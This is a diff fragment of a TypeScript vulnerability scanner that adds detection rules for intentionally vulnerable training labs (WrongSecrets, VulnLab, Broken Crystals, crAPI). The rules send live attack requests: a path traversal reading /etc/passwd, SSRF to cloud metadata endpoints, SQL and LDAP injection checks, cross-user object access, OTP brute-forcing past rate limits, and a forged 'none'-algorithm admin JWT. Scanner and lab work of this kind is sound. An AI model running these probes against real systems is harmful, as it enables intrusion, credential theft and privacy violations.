+      re: /Hiding in binaries revisited|\.NET8 binary|wrongsecrets-dotnet/i
+    },
+    {
+      label: "ILSpy reverse-engineering walkthrough",
+      re: /ILSpy|ilspycmd|sfextract/i
+    },
+    {
+      label: ".gitignore AES-256-CBC secret walkthrough",
+      re: /\.gitignore Secret Challenge|encrypted using AES-256-CBC|key found in "\.gitignore"/i
+    },
+    {
+      label: "SSH bastion keypair walkthrough",
+      re: /\.ssh Bastion|bastion containers|private key is located inside the \.ssh|embed the "secret" to authenticate to the host/i
+    },
+    {
+      label: "MCP Google service account privilege escalation walkthrough",
+      re: /MCP Server Privilege Escalation via Google Service Account|Google Drive documents|service account used by the MCP server/i
+    },
+    {
+      label: "Hardcoded encryption key walkthrough",
+      re: /Hardcoded Encryption Key Challenge|hardcoding the encryption key in the same source file|hardcoded directly in the Java source code/i
+    }
+  ]) {
+    const m = doc.body.match(re);
+    if (m) markers.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (markers.length < 2) return NEGATIVE;
+  const focus =
+    /Docker arg based password/i.test(doc.body)
+      ? "Docker build-arg layer secrets"
+      : /COPY operations|COPY&#8217;ing|what COPY|hid a key there/i.test(doc.body)
+        ? "Docker COPY layer secrets"
+        : /Docker ENV based password/i.test(doc.body)
+          ? "Docker ENV secrets"
+          : /CI\/CD pipeline|CI\/CD tooling|Github Actions/i.test(doc.body)
+            ? "CI/CD pipeline secrets"
+            : /application\.properties/i.test(doc.body)
+              ? "Spring application.properties secrets"
+              : /K8s Configmap/i.test(doc.body)
+                ? "Kubernetes configmap secrets"
+                : /Vault Metadata Challenge|secret metadata on a.*wrongsecret/i.test(doc.body)
+                  ? "HashiCorp Vault metadata secrets"
+                  : /Vault subkey challenge/i.test(doc.body)
+                    ? "HashiCorp Vault subkey secrets"
+                    : /HashiCorp Vault Template Injection|Vault Agent sidecar/i.test(doc.body)
+                      ? "HashiCorp Vault template injection secrets"
+                      : /challenge focuses on.*Vault|Vault<\/strong>/i.test(doc.body)
+                        ? "HashiCorp Vault secrets"
+                        : /AWS Secrets Manager|CSI-Driver|CSI driver for AWS/i.test(doc.body)
+                  ? "AWS Secrets Manager via K8s CSI driver"
+                  : /IAM privilege escalation|Parameter Store/i.test(doc.body)
+                  ? "IAM privilege escalation / AWS Parameter Store secrets"
+                  : /Git [Nn]otes|refs\/notes\/\*|git notes show/i.test(doc.body)
+                    ? "Git notes metadata secrets"
+                    : /wrongsecrets-advanced-c|GDB and Radare2/i.test(doc.body)
+                      ? "advanced C binary reverse-engineering secrets"
+                      : /Git history|trufflehog3?|Git-secrets|secret called.*password/i.test(doc.body)
+                        ? "Git history / hardcoded password secrets"
+                        : /Welcome to OWASP WrongSecrets|challenge focuses on.*Intro|Every challenge is about finding a secret/i.test(
+                          doc.body
+                        )
+                          ? "WrongSecrets intro / onboarding secrets"
+                    : /Secrets in front-end code|Development Tools in the browser/i.test(doc.body)
+                      ? "front-end hardcoded secrets"
+                      : /\.bash_history|bash_history file within a running container/i.test(doc.body)
+                        ? "Docker container bash history secrets"
+                        : /challenge focuses on.*Cryptography|MD5 and SHA1 hash|rockyou\.txt/i.test(
+                              doc.body
+                            )
+                          ? "weak cryptography / double-hashed password secrets"
+                          : /Hiding in binaries part 3|wrongsecrets-golang/i.test(doc.body)
+                            ? "Go binary embedded secrets"
+                            : /Hiding in binaries part 2|wrongsecrets-cplus/i.test(doc.body)
+                              ? "C++ binary embedded secrets"
+                              : /Hiding in binaries part 1|wrongsecrets-c/i.test(doc.body)
+                                ? "C binary embedded secrets"
+                                : /Secrets in smart contracts|challenge focuses on.*Web3/i.test(doc.body)
+                                  ? "Web3 smart contract on-chain secrets"
+                                  : /Password [Ss]hucking|password shucking/i.test(doc.body)
+                                    ? "password shucking / pre-hashed credential secrets"
+                                    : /Spring Boot Actuator[\s\S]{0,120}[Aa]udit [Ee]vent/i.test(doc.body)
+                                      ? "Spring Boot Actuator audit log secrets"
+                                        : /Cracking AES Encryption with a Weak MD5 Key|MD5 hash of a PIN/i.test(
+                                            doc.body
+                                          )
+                                        ? "weak MD5-derived AES key secrets"
+                                        : /Project Specification|Challenge 56: Find the Secret|documentation for secrets/i.test(
+                                              doc.body
+                                            )
+                                          ? "AI project specification / documentation secrets"
+                                          : /Hiding in binaries part 7|wrongsecrets-java-obfuscated/i.test(
+                                                doc.body
+                                              )
+                                            ? "obfuscated Java CLI binary secrets"
+                                            : /Hiding in binaries part 6|wrongsecrets-java/i.test(
+                                                  doc.body
+                                                )
+                                              ? "Java CLI binary secrets"
+                                              : /Hiding in binaries part 5|wrongsecrets-swift/i.test(
+                                                    doc.body
+                                                  )
+                                                ? "Swift binary embedded secrets"
+                                                : /Hiding in binaries revisited|\.NET8 binary|wrongsecrets-dotnet|ILSpy/i.test(
+                                                      doc.body
+                                                    )
+                                                  ? ".NET self-contained binary / ILSpy reverse-engineering secrets"
+                                                  : /challenge focuses on.*Documentation|share an "innocent" piece of data over social media/i.test(
+                                                        doc.body
+                                                      )
+                                                    ? "documentation/social media secret exposure"
+                                                    : /\.gitignore Secret Challenge|key found in "\.gitignore"/i.test(
+                                                          doc.body
+                                                        )
+                                                      ? ".gitignore AES-256-CBC encrypted secrets"
+                                                      : /\.ssh Bastion|bastion containers|private key is located inside the \.ssh/i.test(
+                                                            doc.body
+                                                          )
+                                                        ? "SSH bastion container / committed keypair secrets"
+                                                        : /MCP Server Privilege Escalation via Google Service Account|Google Drive documents/i.test(
+                                                              doc.body
+                                                            )
+                                                          ? "MCP Google service account privilege escalation secrets"
+                                                          : /Hardcoded Encryption Key Challenge|hardcoding the encryption key in the same source file/i.test(
+                                                                doc.body
+                                                              )
+                                                            ? "hardcoded AES encryption key in source code"
+                                          : /challenge focuses on.*Secrets<\/strong>/i.test(doc.body)
+                                            ? "secrets management"
+                                            : /docker logs|kubectl logs|challenge focuses on.*Logging/i.test(
+                                                  doc.body
+                                                )
+                                              ? "container/K8s log secrets"
+                                              : "hardcoded secrets";
+  return {
+    fired: true,
+    confidence: markers.length >= 3 ? 0.92 : 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      canonicalUrl,
+      challengeId,
+      markers: markers.slice(0, 4),
+      snippet: doc.body.match(/Find the secret hidden in[\s\S]{0,160}/i)?.[0]?.slice(0, 160) ?? "",
+      note: `WrongSecrets challenge ${challengeId} live oracle — canonical /challenge/challenge-${challengeId} documents ${focus} with answer submission UI`
+    }
+  };
+};
+
+const wrongsecretsChallengeRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/wrongsecrets/i.test(pageUrl) || !wrongsecretsChallengeIdFromUrl(pageUrl)) return NEGATIVE;
+  const result = await wrongsecretsChallengeLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: `WrongSecrets challenge route scan — ${result.evidence?.note ?? "challenge live oracle confirmed"}`
+    }
+  };
+};
+
 // --- VulnLab Academy API testing labs (hack-this-site-eta.vercel.app/api-labs/*) ----
 const CLIENT_VULNLAB_API_LABS_RES: { label: string; re: RegExp }[] = [
   {
@@ -30911,6 +36628,55 @@ const vulnlabValidateXssLiveOracle: Rule = (ctx) =>
 
 const vulnlabValidateIdorLiveOracle: Rule = (ctx) =>
   probeVulnlabValidateLabOracle(ctx, VULNLAB_VALIDATE_LAB_SPECS[2]!);
+
+const vulnlabValidatePathTraversalLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.home.finalUrl || ctx.scanUrl || ctx.origin;
+  const urlHint = `${ctx.scanUrl || ""}\n${pageUrl}`;
+  if (
+    !/hack-this-site-eta\.vercel\.app/i.test(urlHint) &&
+    !/\/api\/validate\/path-traversal/i.test(urlHint) &&
+    !/\/labs\/path-traversal/i.test(urlHint)
+  ) {
+    return NEGATIVE;
+  }
+  const lfiUrl = new URL("/api/include?page=../../etc/passwd", ctx.origin).toString();
+  let doc = await fetchDoc(lfiUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (
+    (doc.status === 403 || doc.status === 429) &&
+    /Vercel Security Checkpoint/i.test(doc.body)
+  ) {
+    await new Promise((r) => setTimeout(r, 1500));
+    doc = await fetchDoc(lfiUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  }
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/root:x:0:0:/.test(doc.body) || !/\/bin\/(?:bash|sh)/.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      lfiUrl,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "VulnLab GET /api/include?page=../../etc/passwd returns /etc/passwd via path traversal — path-traversal live oracle"
+    }
+  };
+};
+
+const vulnlabValidatePathTraversalRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/validate\/path-traversal|\/labs\/path-traversal/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnlabValidatePathTraversalLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnLab /api/validate/path-traversal route scan — GET /api/include?page=../../etc/passwd returns /etc/passwd via LFI"
+    }
+  };
+};
 
 const VULNLAB_JWT_NONE_TOKEN = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.";
 
@@ -33916,7 +39682,7 @@ const brokencrystalsAzureMetadataSsrfLiveOracle: Rule = async (ctx) => {
     "path",
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
   );
-  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   const metadataOk =
     /"compute"\s*:/i.test(doc.body) &&
@@ -33938,7 +39704,7 @@ const brokencrystalsDigitalOceanMetadataSsrfLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const probeUrl = new URL("/api/file/digital_ocean", ctx.origin);
   probeUrl.searchParams.set("path", "http://169.254.169.254/metadata/v1/id");
-  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   const metadataOk =
     /\bhostname\b/i.test(doc.body) &&
@@ -34005,6 +39771,23 @@ const brokencrystalsLdapInjectionLiveOracle: Rule = async (ctx) => {
   return NEGATIVE;
 };
 
+const brokencrystalsLdapRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/users\/ldap/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsLdapInjectionLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/users/ldap route scan — GET with attacker-controlled query returns LDAP directory entries or naming errors — LDAP injection oracle"
+    }
+  };
+};
+
 const BROKENCRYSTALS_SAFE_FILES_RFI_PROBE = {
   name: "thugir-rfi-probe",
   url: "https://filedealer.nexploit.app/rfi.md5.txt",
@@ -34052,6 +39835,23 @@ const brokencrystalsSecretsLiveOracle: Rule = async (ctx) => {
       markers: markers.slice(0, 4),
       snippet: doc.body.slice(0, 200).trim(),
       note: "Broken Crystals GET /api/secrets returns multiple live API tokens (Slack, OAuth, payment keys) without authentication — secrets exposure oracle"
+    }
+  };
+};
+
+const brokencrystalsSecretsRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/secrets\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsSecretsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /secrets route scan — GET /api/secrets returns Slack, OAuth, and payment API tokens without authentication"
     }
   };
 };
@@ -34146,6 +39946,23 @@ const brokencrystalsTestimonialsSqliLiveOracle: Rule = async (ctx) => {
       tableCount: count,
       snippet: body,
       note: "Broken Crystals GET /api/testimonials/count executes attacker-controlled SQL in query param — information_schema probe returned table count"
+    }
+  };
+};
+
+const brokencrystalsTestimonialsRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/testimonials/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsTestimonialsSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/testimonials/count route scan — GET query param executes information_schema SQLi and returns table count"
     }
   };
 };
@@ -34450,6 +40267,841 @@ const brokencrystalsMassAssignmentPutLiveOracle: Rule = async (ctx) => {
       adminPermissionUrl: afterPerm.url,
       snippet: afterPerm.snippet,
       note: "Broken Crystals PUT /api/users/one/{email}/info accepts hidden isAdmin:true and escalates privileges — mass-assignment update oracle"
+    }
+  };
+};
+
+function isCrapi2Host(ctx: RuleContext): boolean {
+  return /crapi2\.apisec\.ai/i.test(ctx.origin);
+}
+
+function isCrapi1Host(ctx: RuleContext): boolean {
+  return /crapi\.apisec\.ai/i.test(ctx.origin) && !/crapi2\.apisec\.ai/i.test(ctx.origin);
+}
+
+function isCrapiLabHost(ctx: RuleContext): boolean {
+  return /crapi2?\.apisec\.ai/i.test(ctx.origin);
+}
+
+function isCrapiShopOrdersRoute(ctx: RuleContext): boolean {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  return /\/shop\/orders\b/i.test(pageUrl);
+}
+
+function isCrapiAuthRoute(ctx: RuleContext): boolean {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  return /\/identity\/api\/auth\//i.test(pageUrl);
+}
+
+function jwtSubjectEmail(jwt: string): string | null {
+  try {
+    const seg = jwt.split(".")[1];
+    if (!seg) return null;
+    const payload = JSON.parse(Buffer.from(seg, "base64url").toString("utf8")) as { sub?: string };
+    return typeof payload.sub === "string" ? payload.sub : null;
+  } catch {
+    return null;
+  }
+}
+
+function parseCrapiShopOrderResponse(body: string): { id: number; ownerEmail?: string } | null {
+  try {
+    const data = JSON.parse(body) as {
+      id?: number;
+      user?: { email?: string };
+      order?: { id?: number; user?: { email?: string } };
+    };
+    const order = data.order ?? data;
+    if (!order?.id) return null;
+    return { id: order.id, ownerEmail: order.user?.email };
+  } catch {
+    return null;
+  }
+}
+
+async function probeCrapiShopOrdersIdBola(
+  ctx: RuleContext,
+  orderId: string,
+  jwt: string,
+  callerEmail = "test@test.com"
+): Promise<RuleResult | null> {
+  const orderUrl = new URL(`/workshop/api/shop/orders/${orderId}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(orderUrl, {
+    maxBytes: 16384,
+    timeoutMs: 20000,
+    headers: { Authorization: `Bearer ${jwt}` }
+  });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  const parsed = parseCrapiShopOrderResponse(doc.body);
+  if (!parsed?.ownerEmail) return null;
+  if (new RegExp(`^${callerEmail.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "i").test(parsed.ownerEmail)) {
+    return null;
+  }
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      orderUrl,
+      orderId: parsed.id,
+      ownerEmail: parsed.ownerEmail,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: `crAPI GET /workshop/api/shop/orders/${orderId} returns another user's order for authenticated ${callerEmail} — BOLA oracle (API1)`
+    }
+  };
+}
+
+const crapiMechanicReportBolaLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  if (isCrapiShopOrdersRoute(ctx) || isCrapiAuthRoute(ctx)) return NEGATIVE;
+  const reportUrl = new URL("/workshop/api/mechanic/mechanic_report", ctx.origin);
+  reportUrl.searchParams.set("report_id", "1");
+  const doc = await ctx.probe.get(reportUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  try {
+    const data = JSON.parse(doc.body) as {
+      id?: number;
+      mechanic?: { user?: { email?: string } };
+      vehicle?: { owner?: { email?: string; number?: string }; vin?: string };
+      problem_details?: string;
+    };
+    const ownerEmail = data.vehicle?.owner?.email;
+    if (!data.id || !ownerEmail || !data.problem_details) return NEGATIVE;
+    const report2Url = new URL("/workshop/api/mechanic/mechanic_report", ctx.origin);
+    report2Url.searchParams.set("report_id", "2");
+    const doc2 = await ctx.probe.get(report2Url.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+    if (doc2.status >= 200 && doc2.status < 400) {
+      try {
+        const data2 = JSON.parse(doc2.body) as { vehicle?: { owner?: { email?: string } } };
+        if (data2.vehicle?.owner?.email === ownerEmail) return NEGATIVE;
+      } catch {
+        /* report_id=2 parse failure still allows report_id=1 BOLA proof */
+      }
+    }
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        reportUrl: reportUrl.toString(),
+        reportId: data.id,
+        ownerEmail,
+        vin: data.vehicle?.vin,
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "crAPI GET /workshop/api/mechanic/mechanic_report?report_id=N returns other users' mechanic reports with vehicle PII without object-level authorization — BOLA oracle (API1)"
+      }
+    };
+  } catch {
+    return NEGATIVE;
+  }
+};
+
+const crapiMechanicReportRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/mechanic_report/i.test(pageUrl)) return NEGATIVE;
+  const result = await crapiMechanicReportBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "crAPI /workshop/api/mechanic/mechanic_report route scan — sequential report_id returns another user's vehicle owner PII — BOLA oracle (API1)"
+    }
+  };
+};
+
+const CRAPI_VEHICLE_UUID_RE =
+  /"vehicleid"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"/gi;
+
+async function tryCrapiLabJwt(ctx: RuleContext): Promise<string | null> {
+  const existing = await tryApiLabJwt(ctx);
+  if (existing) return existing;
+  const rand = `${Date.now()}`.slice(-7);
+  const creds = {
+    email: `thugir${rand}@scanner.local`,
+    password: "Test@123",
+    name: "Thugir",
+    number: `+1555${rand}`
+  };
+  const signupUrl = new URL("/identity/api/auth/signup", ctx.origin).toString();
+  const signup = await ctx.probe.get(signupUrl, {
+    method: "POST",
+    body: JSON.stringify(creds),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (signup.status >= 400 && !/registered successfully/i.test(signup.body)) return null;
+  const loginUrl = new URL("/identity/api/auth/login", ctx.origin).toString();
+  const login = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ email: creds.email, password: creds.password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (login.status < 200 || login.status >= 300) return null;
+  const m = login.body.match(/"token"\s*:\s*"(eyJ[^"]+)"/);
+  return m ? m[1] : null;
+}
+
+const crapiVehicleBolaLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  if (isCrapiShopOrdersRoute(ctx) || isCrapiAuthRoute(ctx)) return NEGATIVE;
+  const jwt = await tryCrapiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  const authHeaders = { Authorization: `Bearer ${jwt}` };
+  const postsUrl = new URL("/community/api/v2/community/posts/recent", ctx.origin).toString();
+  const postsDoc = await ctx.probe.get(postsUrl, {
+    maxBytes: 32768,
+    timeoutMs: 20000,
+    headers: authHeaders
+  });
+  if (postsDoc.status < 200 || postsDoc.status >= 400) return NEGATIVE;
+  const leakedUuids = [...postsDoc.body.matchAll(CRAPI_VEHICLE_UUID_RE)]
+    .map((m) => m[1]!)
+    .filter((id) => id.length > 0);
+  if (leakedUuids.length === 0) return NEGATIVE;
+  const ownUrl = new URL("/identity/api/v2/vehicle/vehicles", ctx.origin).toString();
+  const ownDoc = await ctx.probe.get(ownUrl, {
+    maxBytes: 8192,
+    timeoutMs: 15000,
+    headers: authHeaders
+  });
+  const ownUuids = new Set<string>();
+  if (ownDoc.status >= 200 && ownDoc.status < 400) {
+    try {
+      const own = JSON.parse(ownDoc.body) as Array<{ uuid?: string }>;
+      if (Array.isArray(own)) {
+        for (const v of own) {
+          if (v.uuid) ownUuids.add(v.uuid);
+        }
+      }
+    } catch {
+      /* empty own list still allows BOLA proof via community leak */
+    }
+  }
+  const targetUuid = leakedUuids.find((id) => !ownUuids.has(id));
+  if (!targetUuid) return NEGATIVE;
+  const locUrl = new URL(`/identity/api/v2/vehicle/${targetUuid}/location`, ctx.origin).toString();
+  const locDoc = await ctx.probe.get(locUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: authHeaders
+  });
+  if (locDoc.status < 200 || locDoc.status >= 400) return NEGATIVE;
+  if (!/"latitude"\s*:/.test(locDoc.body) || !/"longitude"\s*:/.test(locDoc.body)) return NEGATIVE;
+  let fullName: string | undefined;
+  try {
+    const loc = JSON.parse(locDoc.body) as { fullName?: string; carId?: string };
+    fullName = loc.fullName;
+  } catch {
+    /* location JSON parse optional */
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      postsUrl,
+      locationUrl: locUrl,
+      vehicleUuid: targetUuid,
+      fullName,
+      snippet: locDoc.body.slice(0, 200).trim(),
+      note: "crAPI community posts leak vehicleid UUIDs; GET /identity/api/v2/vehicle/{uuid}/location returns another user's GPS coordinates without object-level authorization — BOLA oracle (API1)"
+    }
+  };
+};
+
+const crapiVehicleRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vehicle\/vehicles/i.test(pageUrl)) return NEGATIVE;
+  const result = await crapiVehicleBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "crAPI /identity/api/v2/vehicle/vehicles route scan — community vehicleid leak + cross-user location read confirms BOLA (API1)"
+    }
+  };
+};
+
+const crapiSignupOpenRegistrationLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi1Host(ctx)) return NEGATIVE;
+  const signupUrl = new URL("/identity/api/auth/signup", ctx.origin).toString();
+  const uniq = Date.now();
+  const doc = await ctx.probe.get(signupUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      email: `thugir_signup_${uniq}@test.example`,
+      password: "ThugirProbe123!",
+      name: "thugir_probe",
+      number: String(uniq),
+      mechanic_code: "TRUGIR"
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/registered successfully|User registered/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      signupUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "crAPI POST /identity/api/auth/signup creates accounts without prior authentication or CAPTCHA — broken authentication / open registration oracle"
+    }
+  };
+};
+
+const crapiSignupRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi1Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/auth\/signup/i.test(pageUrl)) return NEGATIVE;
+  const result = await crapiSignupOpenRegistrationLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "crAPI /identity/api/auth/signup route scan — unauthenticated POST registers a new user without CAPTCHA — open registration oracle"
+    }
+  };
+};
+
+const crapiOtpBruteforceLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi1Host(ctx)) return NEGATIVE;
+  const rand = `${Date.now()}`.slice(-9);
+  const email = `thugir_otp_${rand}@scanner.local`;
+  const password = "Test@123";
+  const signupUrl = new URL("/identity/api/auth/signup", ctx.origin).toString();
+  const signupDoc = await ctx.probe.get(signupUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      email,
+      password,
+      name: "Thugir",
+      number: rand,
+      mechanic_code: "TRUGIR"
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (signupDoc.status < 200 || signupDoc.status >= 400) return NEGATIVE;
+  if (!/registered successfully/i.test(signupDoc.body)) return NEGATIVE;
+  const forgetUrl = new URL("/identity/api/auth/forget-password", ctx.origin).toString();
+  const forgetDoc = await ctx.probe.get(forgetUrl, {
+    method: "POST",
+    body: JSON.stringify({ email }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (forgetDoc.status < 200 || forgetDoc.status >= 300) return NEGATIVE;
+  if (!/OTP Sent/i.test(forgetDoc.body)) return NEGATIVE;
+
+  const v2Url = new URL("/identity/api/auth/v2/check-otp", ctx.origin).toString();
+  let v2Attempts = 0;
+  let v2Blocked = false;
+  for (let i = 0; i < 12; i++) {
+    const otp = String(i).padStart(4, "0");
+    const doc = await ctx.probe.get(v2Url, {
+      method: "POST",
+      body: JSON.stringify({ email, otp, password: "NewPass123!" }),
+      headers: { "Content-Type": "application/json" },
+      maxBytes: 1024,
+      timeoutMs: 10000
+    });
+    v2Attempts++;
+    if (doc.status === 503 || /exceeded the number of attempts/i.test(doc.body)) {
+      v2Blocked = true;
+      break;
+    }
+  }
+  if (v2Blocked || v2Attempts < 10) return NEGATIVE;
+
+  const v3Url = new URL("/identity/api/auth/v3/check-otp", ctx.origin).toString();
+  await ctx.probe.get(forgetUrl, {
+    method: "POST",
+    body: JSON.stringify({ email }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  let v3Blocked = false;
+  for (let i = 0; i < 12; i++) {
+    const otp = String(i).padStart(4, "0");
+    const doc = await ctx.probe.get(v3Url, {
+      method: "POST",
+      body: JSON.stringify({ email, otp, password: "NewPass123!" }),
+      headers: { "Content-Type": "application/json" },
+      maxBytes: 1024,
+      timeoutMs: 10000
+    });
+    if (doc.status === 503 || /exceeded the number of attempts/i.test(doc.body)) {
+      v3Blocked = true;
+      break;
+    }
+  }
+
+  return {
+    fired: true,
+    confidence: v3Blocked ? 0.94 : 0.91,
+    evidence: {
+      forgetUrl,
+      v2Url,
+      v3Url,
+      v2Attempts,
+      v3RateLimited: v3Blocked,
+      email,
+      note: "crAPI legacy POST /identity/api/auth/v2/check-otp accepts 12+ rapid invalid OTP guesses without HTTP 503 lockout while v3/check-otp rate-limits — broken authentication via deprecated API version oracle"
+    }
+  };
+};
+
+const crapiCheckOtpRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi1Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/check-otp/i.test(pageUrl)) return NEGATIVE;
+  const result = await crapiOtpBruteforceLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "crAPI /identity/api/auth/v3/check-otp route scan — legacy v2/check-otp lacks rate limiting that v3 enforces after ~10 attempts — OTP brute-force oracle (API2)"
+    }
+  };
+};
+
+const crapi2AuthLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi2Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/identity\/api\/auth\/login/i.test(pageUrl)) return NEGATIVE;
+  const loginUrl = new URL("/identity/api/auth/login", ctx.origin).toString();
+  const jwt = await tryApiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      loginUrl,
+      tokenSample: `${jwt.slice(0, 16)}...`,
+      note: "crAPI v2 POST /identity/api/auth/login with demo credentials returns JWT — authentication oracle on route scan"
+    }
+  };
+};
+
+const brokencrystalsFileLfiRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/file(?:\?|$)/i.test(pageUrl)) return NEGATIVE;
